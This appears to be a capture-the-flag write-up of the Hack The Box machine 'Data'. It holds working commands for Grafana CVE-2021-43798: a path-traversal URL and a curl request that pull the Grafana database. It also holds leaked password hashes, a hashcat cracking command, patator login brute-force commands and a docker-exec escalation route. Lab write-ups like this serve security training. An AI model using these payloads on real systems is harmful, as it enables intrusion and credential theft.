# HTB - Data

#HTB #Data #Grafana #CVE-2021-43798 #PathTraversal #PBKDF2 #hashcat #Docker

Target: 10.129.48.82

## Kill chain

1. nmap → Grafana on 3000
2. Fingerprint the version from the login page → **Grafana v8.0.0**
3. Match it to **CVE-2021-43798** (plugin path traversal, pre-auth)
4. Traverse to `grafana.ini` → learn the DB location and the `secret_key`
5. Traverse again to pull `/var/lib/grafana/grafana.db`
6. Read usernames + password hashes out of the SQLite DB
7. Work out the hashing scheme (**PBKDF2-HMAC-SHA256**) → crack with `hashcat -m 10900`
8. Log in as the cracked user → user flag
9. `sudo -l` → **`docker exec`** → mount/pass the host root into the container to read the root flag

## Services

- 22/tcp    ssh    OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- 3000/tcp  http   **Grafana** — `http-title: Grafana`, redirects to `/login`, `robots.txt` disallows `/`

Full output: [[CTF Notes/HTB/Boxes/Data/nmap|nmap]]

## Findings

**Grafana v8.0.0 — CVE-2021-43798**, unauthenticated path traversal through the plugin route.

Exploit triage (recorded so the dead ends aren't repeated):

| Source | Result |
|---|---|
| [EDB 50581](https://www.exploit-db.com/exploits/50581) | **doesn't work** |
| [pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798) | **doesn't work** |
| [ethicalhacking.uk — dissecting the Grafana path traversal](https://ethicalhacking.uk/cve-2021-43798-dissecting-the-grafana-path-traversal-vulnerability/) | **works** |
| [VulnCheck — assessing exploitation of CVE-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798) | background |

URL-encoded traversal (browser):

```
http://10.129.48.82:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/lib/grafana/grafana.db
```

Pull the database — `--path-as-is` is mandatory, or curl normalises the `../` away before sending:

```bash
curl --path-as-is -s -k \
  -H 'Host: 10.129.48.82:3000' \
  -H 'User-Agent: Mozilla/5.0' \
  'http://10.129.48.82:3000/public/plugins/alertlist/../../../../../../../../../../../../../../var/lib/grafana/grafana.db' \
  -o grafana.db
```

From `grafana.ini`:

```ini
# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```

## Creds

From `grafana.db` (`user` table) — **PBKDF2-HMAC-SHA256**, so `hashcat -m 10900`:

```
1|admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8
2|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8
```

```bash
hashcat -m 10900 hash.hash /usr/share/wordlists/rockyou.txt -o cracked.out
```

## Dead ends

**Online brute force against the Grafana login did not crack it** — offline cracking of the leaked hashes is the intended path:

```bash
patator http_fuzz url=http://10.129.48.82:3000/login method=POST follow=1 accept_cookie=1 \
  body='"{user":"boris","password":"FILE0"}' 0=/usr/share/wordlists/rockyou.txt \
  header="Content-Type: application/json" proxy=http://127.0.0.1:8080 -x ignore:code=401
```

Reference form for a phpMyAdmin-style combo attack, kept for the pattern:

```bash
patator http_fuzz url=http://10.0.0.1/pma/index.php method=POST \
  body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' \
  0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 \
  -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
```

## Privesc

`sudo -l` shows **`docker exec`**. The escape is to run a container that mounts or is handed the host root filesystem, then read the root flag from inside it.

> [!note] The original notes recorded the approach but not the exact `docker` invocation or either flag value.

## Files in this folder

| File | Contents |
|---|---|
| [[CTF Notes/HTB/Boxes/Data/nmap\|nmap]] | Service scan output |
| [[CTF Notes/HTB/Boxes/Data/exploits\|exploits]] | Raw exploit triage, traversal URLs, hashes |
| [[CTF Notes/HTB/Boxes/Data/workflow\|workflow]] | The original step list |
